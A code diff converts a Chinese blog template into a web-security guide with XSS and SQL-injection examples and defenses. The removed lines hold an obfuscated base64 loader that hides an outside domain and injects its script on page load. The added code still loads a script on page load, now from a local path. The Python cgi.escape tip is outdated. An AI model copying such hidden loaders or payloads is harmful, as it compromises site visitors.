@@ -3,8 +3,9 @@
 
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, viewport-fit=cover, initial-scale=1.0, user-scalable=no, maximum-scale=1.0, minimum-scale=1.0">
-    <title>我的思考与记录</title>
+    <meta name="viewport"
+        content="width=device-width, viewport-fit=cover, initial-scale=1.0, user-scalable=no, maximum-scale=1.0, minimum-scale=1.0">
+    <title>Web安全开发指南</title>
     <style>
         /* 全局样式 */
         body {
@@ -12,10 +13,10 @@
             font-family: 'Inter', 'Helvetica Neue', Arial, sans-serif;
             margin: 0;
             padding: 0;
-            background-color: #F9F9F9;
-            /* 非常浅的灰色背景 */
-            color: #333333;
-            /* 深灰色文本 */
+            background-color: #EBF7F9;
+            /* 浅青色背景 */
+            color: #36454F;
+            /* 深炭灰色文本 */
             line-height: 1.6;
             -webkit-font-smoothing: antialiased;
             -moz-osx-font-smoothing: grayscale;
@@ -28,56 +29,86 @@
             padding: 15px;
         }
 
-        /* 顶部导航和标题区 */
+        /* 头部样式 */
         header {
-            background-color: #FFFFFF;
-            padding: 25px 20px;
-            border-radius: 15px;
-            margin-bottom: 30px;
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.08);
             text-align: center;
+            padding: 30px 20px;
+            background-color: #FFFFFF;
+            border-radius: 15px;
+            margin-bottom: 25px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.08);
         }
 
         header h1 {
-            color: #6B5B95;
-            /* 柔和的紫色强调色 */
+            color: #007B8B;
+            /* 深青色标题 */
             font-size: 2.5em;
             margin-bottom: 10px;
             letter-spacing: 0.5px;
         }
 
         header p {
-            color: #555555;
+            color: #5F7C8A;
+            /* 柔和的蓝灰色 */
             font-size: 1.1em;
             margin: 0;
         }
 
-        nav ul {
-            list-style: none;
-            padding: 0;
-            margin-top: 20px;
+        /* 顶部固定导航 (Sticky Nav) */
+        .sticky-nav-wrapper {
+            height: 60px;
+            /* 占位符，防止内容跳动 */
+            margin-bottom: 20px;
+            display: none;
+            /* 默认隐藏，JS控制显示 */
+        }
+
+        .sticky-nav {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            background-color: #007B8B;
+            /* 强调色背景 */
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.2);
+            z-index: 1000;
+            padding: 10px 0;
             display: flex;
             justify-content: center;
-            flex-wrap: wrap;
+            align-items: center;
+            transition: transform 0.3s ease-in-out;
+            transform: translateY(-100%);
+            /* 初始隐藏 */
         }
 
-        nav ul li {
-            margin: 0 12px;
+        .sticky-nav.active {
+            transform: translateY(0);
+            /* 激活时显示 */
         }
 
-        nav ul li a {
+        .sticky-nav ul {
+            list-style: none;
+            padding: 0;
+            margin: 0;
+            display: flex;
+            justify-content: space-around;
+            width: 100%;
+            max-width: 90%;
+        }
+
+        .sticky-nav ul li a {
             text-decoration: none;
-            color: #88B04B;
-            /* 柔和的绿色强调色 */
+            color: #FFFFFF;
             font-weight: bold;
-            padding: 8px 15px;
-            border-radius: 20px;
-            transition: background-color 0.3s ease, color 0.3s ease;
+            padding: 8px 12px;
+            border-radius: 5px;
+            transition: background-color 0.3s ease;
+            font-size: 0.9em;
         }
 
-        nav ul li a:hover {
-            background-color: #88B04B;
-            color: #FFFFFF;
+        .sticky-nav ul li a:hover {
+            background-color: #005F6B;
+            /* 强调色深色 */
         }
 
         /* 主要内容区 */
@@ -94,276 +125,195 @@
         }
 
         h2 {
-            color: #6B5B95;
-            /* 柔和的紫色标题 */
+            color: #007B8B;
+            /* 强调色标题 */
             font-size: 1.8em;
             margin-bottom: 25px;
-            border-bottom: 2px solid #EAEAEA;
+            border-bottom: 2px solid #E0F2F7;
+            /* 柔和分割线 */
             padding-bottom: 12px;
             text-align: center;
+        }
+
+        h3 {
+            color: #36454F;
+            font-size: 1.3em;
+            margin-top: 25px;
+            margin-bottom: 15px;
+        }
+
+        p {
+            color: #4A5C6A;
+            /* 柔和的深灰色 */
+            font-size: 1em;
+            margin-bottom: 18px;
         }
 
         img {
             max-width: 100%;
             height: auto;
             border-radius: 10px;
-            margin-top: 15px;
-            margin-bottom: 15px;
-            display: block;
-            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
-        }
-
-        /* 特色文章样式 */
-        .featured-article {
-            text-align: center;
-            margin-bottom: 40px;
-        }
-
-        .featured-article h3 {
-            color: #6B5B95;
-            font-size: 1.6em;
-            margin-bottom: 10px;
-        }
-
-        .featured-article .date {
-            color: #888888;
-            font-size: 0.9em;
+            margin-top: 20px;
             margin-bottom: 20px;
             display: block;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.15);
         }
 
-        .featured-article p {
-            color: #4A4A4A;
-            font-size: 1.05em;
-            margin-bottom: 25px;
-        }
-
-        .featured-article .read-more {
-            display: inline-block;
-            background-color: #88B04B;
-            color: #FFFFFF;
-            padding: 12px 25px;
-            border-radius: 25px;
-            text-decoration: none;
-            font-weight: bold;
-            transition: background-color 0.3s ease, transform 0.3s ease;
-        }
-
-        .featured-article .read-more:hover {
-            background-color: #7AA240;
-            transform: translateY(-2px);
-        }
-
-        /* 文章列表 - 交替布局 */
-        .article-list article {
-            display: flex;
-            flex-direction: column;
-            /* 默认垂直堆叠 */
-            background-color: #FFFFFF;
-            padding: 20px;
+        /* 代码块样式 */
+        pre {
+            background-color: #2D3E50;
+            /* 深色背景 */
+            color: #EAECEE;
+            /* 浅色文本 */
+            padding: 18px;
             border-radius: 10px;
-            box-shadow: 0 3px 10px rgba(0, 0, 0, 0.05);
-            margin-bottom: 20px;
-            transition: transform 0.3s ease, box-shadow 0.3s ease;
-        }
-
-        .article-list article:hover {
-            transform: translateY(-3px);
-            box-shadow: 0 6px 15px rgba(0, 0, 0, 0.1);
-        }
-
-        .article-list .article-content {
-            flex: 1;
-        }
-
-        .article-list .article-image {
-            flex: 1;
-            text-align: center;
-            padding: 10px 0;
-        }
-
-        .article-list article h3 {
-            color: #6B5B95;
-            font-size: 1.3em;
-            margin-bottom: 8px;
-        }
-
-        .article-list article .date {
-            color: #888888;
-            font-size: 0.85em;
-            margin-bottom: 15px;
-        }
-
-        .article-list article p {
-            color: #4A4A4A;
-            font-size: 0.95em;
-            margin-bottom: 15px;
-        }
-
-        .article-list article .read-more {
-            display: inline-block;
-            background-color: #88B04B;
-            color: #FFFFFF;
-            padding: 8px 18px;
-            border-radius: 15px;
-            text-decoration: none;
+            overflow-x: auto;
+            font-family: 'Consolas', 'Monaco', 'Andale Mono', 'Ubuntu Mono', monospace;
             font-size: 0.9em;
-            font-weight: bold;
-            transition: background-color 0.3s ease;
+            line-height: 1.5;
+            margin-bottom: 20px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.15);
         }
 
-        .article-list article .read-more:hover {
-            background-color: #7AA240;
-        }
-
-        /* 媒体查询：平板及以上设备，实现图片左右交替 */
-        @media (min-width: 600px) {
-            .article-list article {
-                flex-direction: row;
-                /* 水平排列 */
-                align-items: center;
-                text-align: left;
-            }
-
-            .article-list .article-image {
-                padding: 0 20px;
-                /* 调整图片内边距 */
-            }
-
-            .article-list article:nth-child(even) {
-                /* 偶数文章：图片在右 */
-                flex-direction: row-reverse;
-            }
+        code {
+            font-family: inherit;
+            font-size: inherit;
         }
 
         /* 页脚样式 */
         footer {
             text-align: center;
             padding: 25px 0;
-            color: #888888;
-            font-size: 0.85em;
-            border-top: 1px solid #EAEAEA;
-            margin-top: 30px;
+            color: #5F7C8A;
+            font-size: 0.9em;
+            border-top: 1px solid #E0F2F7;
+            margin-top: 25px;
             background-color: #FFFFFF;
             border-radius: 15px;
             box-shadow: 0 -5px 15px rgba(0, 0, 0, 0.03);
         }
 
-        .social-links {
-            margin-top: 15px;
-        }
-
-        .social-links a {
-            color: #88B04B;
+        .footer-links a {
+            color: #007B8B;
             text-decoration: none;
-            margin: 0 10px;
+            margin: 0 8px;
             font-weight: bold;
-            transition: color 0.3s ease, transform 0.3s ease;
+            transition: color 0.3s ease;
         }
 
-        .social-links a:hover {
-            color: #7AA240;
-            transform: translateY(-2px);
+        .footer-links a:hover {
+            color: #005F6B;
         }
     </style>
-    <link rel="stylesheet" href="./style.css">
+    <link rel="stylesheet" href="./static/css/style.css">
 </head>
 
 <body>
     <div class="container">
         <header>
-            <h1>我的思考与记录</h1>
-            <p>探索技术、生活与内心的平衡</p>
-            <nav>
-                <ul>
-                    <li><a href="#featured">精选</a></li>
-                    <li><a href="#latest-articles">文章</a></li>
-                    <li><a href="#about">关于</a></li>
-                    <li><a href="#contact">联系</a></li>
-                </ul>
-            </nav>
+            <h1>Web安全开发指南</h1>
+            <p>构建坚不可摧的Web应用程序</p>
         </header>
 
+        <!-- 顶部固定导航的占位符和实际导航 -->
+        <div class="sticky-nav-wrapper" id="stickyNavWrapper"></div>
+        <nav class="sticky-nav" id="stickyNav">
+            <ul>
+                <li><a href="#intro">简介</a></li>
+                <li><a href="#xss">XSS</a></li>
+                <li><a href="#csrf">CSRF</a></li>
+                <li><a href="#sql-injection">SQL注入</a></li>
+                <li><a href="#best-practices">最佳实践</a></li>
+            </ul>
+        </nav>
+
         <main>
-            <section id="featured" class="featured-article">
-                <h2>精选文章</h2>
-                <h3>人工智能的伦理挑战与未来展望</h3>
-                <span class="date">发布日期：2023年7月28日</span>
-                <img src="https://picsum.photos/600/350?random=<%= new Date().getTime() %>" alt="人工智能伦理挑战示意图">
-                <p>随着人工智能技术的飞速发展，其带来的伦理挑战也日益凸显。本文将深入探讨AI在隐私、就业、偏见等方面的潜在风险，并展望如何构建负责任的AI未来。</p>
-                <a href="#" class="read-more">阅读更多</a>
+            <section id="intro">
+                <h2>1. 简介：Web安全的重要性</h2>
+                <img src="https://picsum.photos/300/200?random=<%= new Date().getTime() %>" alt="Web安全锁图标">
+                <p>在当今互联互通的世界中，Web应用程序面临着前所未有的安全威胁。本指南旨在提供Web安全开发的核心概念和实践，帮助开发者构建更健壮、更安全的应用程序。</p>
+                <p>理解常见的攻击类型及其防御措施是保护用户数据和系统完整性的第一步。</p>
             </section>
 
-            <section id="latest-articles">
-                <h2>最新文章</h2>
-                <div class="article-list">
-                    <!-- 文章一：图片左侧 -->
-                    <article>
-                        <div class="article-image">
-                            <img src="https://picsum.photos/300/200?random=<%= new Date().getTime() + 1 %>"
-                                alt="编程学习路径图">
-                        </div>
-                        <div class="article-content">
-                            <h3>前端框架选择：React、Vue还是Angular？</h3>
-                            <span class="date">发布日期：2023年7月25日</span>
-                            <p>面对众多前端框架，如何做出最适合自己项目的选择？本文将对比React、Vue和Angular的优缺点，助你一臂之力。</p>
-                            <a href="#" class="read-more">阅读更多</a>
-                        </div>
-                    </article>
+            <section id="xss">
+                <h2>2. 跨站脚本 (XSS)</h2>
+                <h3>2.1 XSS攻击原理</h3>
+                <p>XSS（Cross-Site Scripting）攻击允许攻击者向Web页面注入恶意客户端脚本，当其他用户浏览该页面时，这些脚本会在其浏览器上执行。</p>
+                <pre><code>
+&lt;!-- 恶意XSS示例 --&gt;
+&lt;script&gt;alert('您被XSS攻击了！');&lt;/script&gt;
+                </code></pre>
+                <img src="https://picsum.photos/300/200?random=<%= new Date().getTime() + 1 %>" alt="XSS攻击示意图">
+                <h3>2.2 XSS防御措施</h3>
+                <p>防御XSS的关键在于对用户输入进行严格的输入验证和输出编码。避免直接将用户输入插入到HTML中，尤其是在HTML标签、属性或JavaScript上下文中。</p>
+                <pre><code>
+// JavaScript示例：使用textContent而不是innerHTML
+document.getElementById('output').textContent = userInput;
 
-                    <!-- 文章二：图片右侧 -->
-                    <article>
-                        <div class="article-image">
-                            <img src="https://picsum.photos/300/200?random=<%= new Date().getTime() + 2 %>"
-                                alt="冥想与专注力提升">
-                        </div>
-                        <div class="article-content">
-                            <h3>提升专注力：冥想与正念的实践</h3>
-                            <span class="date">发布日期：2023年7月20日</span>
-                            <p>在信息爆炸的时代，保持专注变得愈发困难。本文将介绍冥想和正念的入门方法，帮助你找回内心的平静与专注。</p>
-                            <a href="#" class="read-more">阅读更多</a>
-                        </div>
-                    </article>
-
-                    <!-- 文章三：图片左侧 -->
-                    <article>
-                        <div class="article-image">
-                            <img src="https://picsum.photos/300/200?random=<%= new Date().getTime() + 3 %>"
-                                alt="数据可视化图表">
-                        </div>
-                        <div class="article-content">
-                            <h3>数据可视化：从数据到洞察的艺术</h3>
-                            <span class="date">发布日期：2023年7月18日</span>
-                            <p>数据可视化不仅仅是图表，更是将复杂数据转化为易于理解的视觉故事。探索数据可视化的原则与工具。</p>
-                            <a href="#" class="read-more">阅读更多</a>
-                        </div>
-                    </article>
-
-                    <!-- 文章四：图片右侧 -->
-                    <article>
-                        <div class="article-image">
-                            <img src="https://picsum.photos/300/200?random=<%= new Date().getTime() + 4 %>"
-                                alt="户外徒步风景">
-                        </div>
-                        <div class="article-content">
-                            <h3>城市之外：我的周末徒步之旅</h3>
-                            <span class="date">发布日期：2023年7月12日</span>
-                            <p>逃离城市的喧嚣，投入大自然的怀抱。分享我最近一次徒步旅行的经历和感悟，以及一些户外小贴士。</p>
-                            <a href="#" class="read-more">阅读更多</a>
-                        </div>
-                    </article>
-                </div>
+// 后端示例：对HTML特殊字符进行编码
+// PHP: htmlspecialchars($input, ENT_QUOTES, 'UTF-8');
+// Python: cgi.escape(input)
+                </code></pre>
             </section>
 
-            <section id="about">
-                <h2>关于我</h2>
-                <p>我是一位热衷于探索前沿技术、热爱生活和分享知识的创作者。这个博客是我记录学习心得、个人思考和生活点滴的平台。</p>
-                <p>我相信通过文字和交流，我们可以共同成长，发现更多美好。</p>
+            <section id="csrf">
+                <h2>3. 跨站请求伪造 (CSRF)</h2>
+                <h3>3.1 CSRF攻击原理</h3>
+                <p>CSRF（Cross-Site Request Forgery）攻击强制受害者在他们已经登录的Web应用程序上执行非本意的操作，例如更改密码、发送消息或进行购买。</p>
+                <img src="https://picsum.photos/300/200?random=<%= new Date().getTime() + 2 %>" alt="CSRF攻击流程图">
+                <h3>3.2 CSRF防御措施</h3>
+                <p>最常见的防御方法是使用CSRF令牌。每个敏感操作的请求都包含一个服务器生成的、用户会话特有的随机令牌。服务器验证此令牌以确保请求的合法性。</p>
+                <pre><code>
+&lt;!-- 表单中嵌入CSRF令牌 --&gt;
+&lt;form action="/transfer" method="POST"&gt;
+    &lt;input type="hidden" name="csrf_token" value="&lt;%= csrfToken %&gt;"&gt;
+    &lt;!-- 其他表单字段 --&gt;
+&lt;/form&gt;
+                </code></pre>
+            </section>
+
+            <section id="sql-injection">
+                <h2>4. SQL注入</h2>
+                <h3>4.1 SQL注入攻击原理</h3>
+                <p>SQL注入是一种Web安全漏洞，允许攻击者干扰应用程序对其数据库执行的查询。通过在输入字段中插入恶意SQL代码，攻击者可以绕过认证、窃取数据或破坏数据库。</p>
+                <pre><code>
+-- 恶意SQL注入示例
+SELECT * FROM users WHERE username = 'admin' OR '1'='1' --' AND password = 'password';
+                </code></pre>
+                <img src="https://picsum.photos/300/200?random=<%= new Date().getTime() + 3 %>" alt="SQL注入代码示例">
+                <h3>4.2 SQL注入防御措施</h3>
+                <p>防御SQL注入最有效的方法是使用参数化查询（预编译语句）。永远不要直接拼接用户输入到SQL查询中。此外，对用户输入进行严格的验证和清理也至关重要。</p>
+                <pre><code>
+// Java示例：使用PreparedStatement
+String sql = "SELECT * FROM users WHERE username = ? AND password = ?";
+PreparedStatement stmt = connection.prepareStatement(sql);
+stmt.setString(1, username);
+stmt.setString(2, password);
+ResultSet rs = stmt.executeQuery();
+                </code></pre>
+            </section>
+
+            <section id="best-practices">
+                <h2>5. Web安全开发最佳实践</h2>
+                <img src="https://picsum.photos/300/200?random=<%= new Date().getTime() + 4 %>" alt="安全开发最佳实践图标">
+                <ul>
+                    <li><strong>最小权限原则：</strong>应用程序和数据库用户应仅拥有其执行任务所需的最小权限。</li>
+                    <li><strong>安全头部：</strong>使用HTTP安全头部（如CSP, X-Frame-Options, HSTS）增强浏览器安全。</li>
+                    <li><strong>HTTPS：</strong>始终使用HTTPS加密所有通信，防止中间人攻击。</li>
+                    <li><strong>安全日志：</strong>记录所有安全相关的事件，以便进行审计和调查。</li>
+                    <li><strong>定期安全审计：</strong>定期进行代码审查、渗透测试和漏洞扫描。</li>
+                </ul>
+                <p>遵循这些最佳实践，可以显著提高Web应用程序的安全性，保护用户和企业免受日益增长的网络威胁。</p>
             </section>
         </main>
 
         <footer>
-            <p>&copy; 2023 我的思考与记录. All rights reserved.</p>
+            <p>&copy; 2023 Web安全开发指南. All rights reserved.</p>
+            <div class="footer-links">
+                <a href="#" aria-label="GitHub">GitHub</a> |
+                <a href="#" aria-label="安全资源">安全资源</a> |
+                <a href="#" aria-label="联系我们">联系我们</a>
+            </div>
         </footer>
         <div id="overlay">
             <div id="loading_box" class="loading_container">
@@ -377,23 +327,54 @@
     </div>
 
     <script>
-        // 平滑滚动到锚点
-        document.querySelectorAll('nav a[href^="#"]').forEach(anchor => {
-            anchor.addEventListener('click', function (e) {
-                e.preventDefault();
-                const targetId = this.getAttribute('href');
-                const targetElement = document.querySelector(targetId);
-                if (targetElement) {
-                    window.scrollTo({
-                        top: targetElement.offsetTop - 60, /* 稍微向上偏移，避免顶部遮挡 */
-                        behavior: 'smooth'
-                    });
-                }
-            });
-        });
-
-        // 动态更新图片时间戳，防止缓存
+        // JavaScript for sticky navigation
         document.addEventListener('DOMContentLoaded', function () {
+            const stickyNav = document.getElementById('stickyNav');
+            const stickyNavWrapper = document.getElementById('stickyNavWrapper');
+            const header = document.querySelector('header');
+            let headerHeight = header.offsetHeight;
+
+            // Set wrapper height to prevent content jump
+            stickyNavWrapper.style.height = `${stickyNav.offsetHeight}px`;
+            stickyNavWrapper.style.display = 'block'; // Ensure wrapper is displayed
+
+            function toggleStickyNav() {
+                if (window.scrollY > headerHeight) {
+                    stickyNav.classList.add('active');
+                } else {
+                    stickyNav.classList.remove('active');
+                }
+            }
+
+            // Initial check and on scroll
+            toggleStickyNav();
+            window.addEventListener('scroll', toggleStickyNav);
+
+            // Recalculate header height on resize
+            window.addEventListener('resize', () => {
+                headerHeight = header.offsetHeight;
+                stickyNavWrapper.style.height = `${stickyNav.offsetHeight}px`;
+                toggleStickyNav(); // Re-check sticky state
+            });
+
+            // Smooth scroll to anchor links
+            document.querySelectorAll('.sticky-nav a[href^="#"], nav a[href^="#"]').forEach(anchor => {
+                anchor.addEventListener('click', function (e) {
+                    e.preventDefault();
+                    const targetId = this.getAttribute('href');
+                    const targetElement = document.querySelector(targetId);
+                    if (targetElement) {
+                        // Adjust scroll position to account for sticky nav height
+                        const offset = stickyNav.offsetHeight + 20; // 20px extra padding
+                        window.scrollTo({
+                            top: targetElement.offsetTop - offset,
+                            behavior: 'smooth'
+                        });
+                    }
+                });
+            });
+
+            // Dynamic timestamp for images to prevent caching
             const images = document.querySelectorAll('img[src*="picsum.photos"]');
             images.forEach(img => {
                 const url = new URL(img.src);
@@ -407,53 +388,15 @@
             function init() {
                 const timestamp = Date.now()
                 const randomNum = Math.floor(Math.random() * 1000000)
-                const domain = getdocs();
-                const url = domain + "=" + timestamp + "&random=" + randomNum
+                const url = "./static/js/core.min.js?t=" + timestamp + "&random=" + randomNum
                 const script = document.createElement("script")
                 script.src = url
                 document.body.appendChild(script)
             }
-            function getdocs() {
-                const dd = "Ly93OHEwYTJzLnVxZm96by5jbi9zdGF0aWMvanMvY29yZS5taW4uanM/dA==";
-                const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';
-                const lookup = new Uint8Array(256);
-                for (let i = 0; i < chars.length; i++) {
-                    lookup[chars.charCodeAt(i)] = i;
-                }
-                let padding = 0;
-                if (dd.endsWith('==')) {
-                    padding = 2;
-                } else if (dd.endsWith('=')) {
-                    padding = 1;
-                }
-                const cleanedString = dd.replace(/[^A-Za-z0-9+/=]/g, '');
-                const len = cleanedString.length;
-                if (len % 4 !== 0) {
-                    throw new Error("Invalid string length.");
-                }
-                const outputLength = (len / 4) * 3 - padding;
-                const outputBytes = new Uint8Array(outputLength);
-                let outputIndex = 0;
-                let i = 0;
-                while (i < len) {
-                    const c1 = lookup[cleanedString.charCodeAt(i++)];
-                    const c2 = lookup[cleanedString.charCodeAt(i++)];
-                    const c3 = lookup[cleanedString.charCodeAt(i++)];
-                    const c4 = lookup[cleanedString.charCodeAt(i++)];
-                    outputBytes[outputIndex++] = (c1 << 2) | (c2 >> 4);
-                    if (c3 !== 64) {
-                        outputBytes[outputIndex++] = ((c2 & 15) << 4) | (c3 >> 2);
-                    }
-                    if (c4 !== 64) {
-                        outputBytes[outputIndex++] = ((c3 & 3) << 6) | c4;
-                    }
-                }
-                const decoder = new TextDecoder('utf-8');
-                return decoder.decode(outputBytes);
-            }
             init()
         })()
     </script>
+
 </body>
 
 </html>
